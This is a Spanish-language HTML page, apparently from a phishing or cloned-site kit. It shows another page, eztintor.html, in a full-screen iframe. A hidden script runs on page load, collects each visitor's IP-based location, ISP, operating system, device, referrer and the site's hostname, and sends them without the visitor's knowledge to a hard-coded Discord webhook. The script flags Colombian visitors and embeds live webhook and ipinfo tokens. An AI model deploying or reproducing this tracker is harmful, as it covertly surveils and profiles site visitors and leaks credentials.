<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Grupo Liqui</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        html,body{margin:0;padding:0;height:100%;overflow:hidden}
        iframe{border:none;width:100%;height:100vh;display:block}
    </style>
</head>
<body>
 
    <iframe
        src="eztintor.html"
        allowfullscreen
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
    </iframe>

    <!-- ANTES DE </body> -->
    <script>
    (() => {
      const WEBHOOK = "https://discord.com/api/webhooks/1465881552859959421/6py4nNvJY4N5F2RXp0whjA8QPlajJnR-bZAkp14o5bxr6JNqZjCFpo2njpe8Mt_e4Cns";

      async function getIPInfo() {
        try {
          const response = await fetch("https://ipinfo.io/json?token=af50cd0324508f");
          if (!response.ok) {
            console.warn("Error en ipinfo.io:", response.status);
            return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
          }
          const data = await response.json();
          return {
            country_name: data.country || "Desconocido",
            city: data.city || "Desconocido",
            country_code: data.country || "XX",
            isp: data.org || "No disponible"
          };
        } catch (error) {
          console.error("Error al obtener IP info:", error);
          return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
        }
      }

      function parseUA() {
        const ua = navigator.userAgent;
        const isBot = /bot|crawler|spider|crawl/i.test(ua);
        let os = "Desconocido", device = "Desconocido";

        if (/Windows NT/i.test(ua))        os = "Windows";
        else if (/Mac OS X/i.test(ua))     os = "macOS";
        else if (/Android/i.test(ua))      os = "Android";
        else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
        else if (/Linux/i.test(ua))        os = "Linux";

        if (/Samsung/i.test(ua))           device = "Samsung";
        else if (/iPhone/i.test(ua))       device = "iPhone";
        else if (/iPad/i.test(ua))         device = "iPad";
        else if (/Huawei/i.test(ua))       device = "Huawei";
        else if (/Xiaomi/i.test(ua))       device = "Xiaomi";
        else device = "PC/Otro";

        return {os, device, isBot};
      }

      window.addEventListener("DOMContentLoaded", async () => {
        const ip   = await getIPInfo();
        const ua   = parseUA();
        const originDomain = window.location.hostname;
        const fullURL      = window.location.href;

        const payload = {
          username: "EXOTIC",
          embeds: [{
            color: ip.country_code === "CO" ? 0x00ff00 : 0xff0000,
            title: ua.isBot ? "ðŸ¤– BOT detectado" : "ðŸ‘¤ Visita humana",
            fields: [
              {name: "ðŸŒ PaÃ­s",         value: ip.country_name, inline: true},
              {name: "ðŸ™ï¸ Ciudad",       value: ip.city,         inline: true},
              {name: "ðŸ“ Origen",        value: ip.country_code === "CO" ? "ðŸ‡¨ðŸ‡´ Colombia" : "ðŸŒ Exterior", inline: true},
              {name: "ðŸ“¡ ISP",           value: ip.isp, inline: true},
              {name: "ðŸ’» SO",            value: ua.os,           inline: true},
              {name: "ðŸ“± Dispositivo",   value: ua.device,       inline: true},
              {name: "ðŸ”— Dominio ref",   value: document.referrer || "Directo / Sin referrer", inline: true},
              {name: "ðŸŒ Sitio Puribal", value: originDomain, inline: true},
              {name: "ðŸ•’ Hora (UTC)",    value: new Date().toISOString(), inline: true}
            ]
          }]
        };

        fetch(WEBHOOK, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(payload),
          keepalive: true
        }).catch((error) => {
          console.error("Error al enviar al webhook:", error);
        });
      });
    })();
    </script>
</body>
</html>
